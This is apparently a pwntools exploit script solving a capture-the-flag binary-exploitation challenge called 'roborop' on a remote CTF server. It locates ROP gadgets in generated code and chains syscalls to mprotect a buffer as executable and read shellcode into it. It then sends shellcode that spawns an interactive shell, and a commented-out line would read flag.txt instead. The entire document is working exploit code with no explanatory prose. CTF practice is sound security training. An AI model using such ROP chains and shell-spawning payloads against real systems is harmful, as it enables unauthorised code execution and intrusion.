#!/usr/bin/env python3
from pwn import *
import random
import os

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

exe = context.binary = ELF(args.EXE or './roborop')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b sleep
c
'''.format(**locals())

# io = start()

io = remote("roborop-1.play.hfsc.tf", 1993)

io.recvuntil(b"seed: ")
seed_line = io.recvline().strip()
seed = int(seed_line, 16)
io.recvuntil(b"addr: ")
addr_line = io.recvline().strip()
addr = int(addr_line, 16)
print(f"seed: {hex(seed)}")
print(f"addr: {hex(addr)}")


os.system(f"./gen {hex(seed)}")

with open("gen.bin", "rb") as f:
    d = f.read()

class Gt():
    def __init__(self, name):
        self.name = name
        self.bytes = asm(name)
        self.address = None

    def resolved(self):
        return self.address != None

gadgets = {}

def get_gadget_by_name(name):
    if name in gadgets:
        return gadgets[name]
    else:
        gadgets[name] = Gt(name)
        gadgets[name].address = d.find(gadgets[name].bytes)
        if gadgets[name].address == -1:
            print(f"failed to find {name}")
            exit(1)
        gadgets[name].address += addr
        return gadgets[name]

def b(s):
    gadget = get_gadget_by_name(s)
    print("found", s, hex(gadget.address))
    return p64(gadget.address)

shellcode_buff = addr + 0x10000000 - 0x1000

chain = b""
chain += b("pop rdi; ret") + p64(shellcode_buff)
chain += b("pop rax; ret") + p64(10)
chain += b("pop rsi; ret") + p64(0x1000)
chain += b("pop rdx; ret") + p64(7)
chain += b("syscall; ret")

# RAX is already zero
chain += b("pop rdi; ret") + p64(0) 
chain += b("pop rsi; ret") + p64(shellcode_buff)
chain += b("pop rdx; ret") + p64(0x1000)
chain += b("syscall; ret")
chain += p64(shellcode_buff)

io.recvuntil(b"rops: ")
assert(len(chain) < 0x400)
print("chain len", hex(len(chain)))
io.sendline(chain)
time.sleep(0.1)

# payload = "\x90" * 0x100 + "\xcc"
# io.sendline(asm(shellcraft.amd64.linux.cat("./flag.txt", 1)))
io.sendline(asm(shellcraft.amd64.linux.sh()))
# io.sendline(payload)

io.interactive()